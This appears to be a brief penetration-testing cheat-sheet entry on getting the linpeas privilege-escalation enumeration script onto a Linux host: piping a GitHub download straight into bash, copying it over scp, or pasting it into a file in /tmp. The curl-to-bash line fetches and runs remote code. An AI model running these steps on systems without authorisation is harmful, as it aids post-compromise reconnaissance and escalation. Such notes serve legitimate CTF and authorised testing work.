# linpeas

If `curl` works:

    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

Otherwise if you're on same network:

    scp $USER@$IP:<path-to-linpeas> .

Last resort:

    cd /tmp
    nano linpeas.sh
    bash linpeas.sh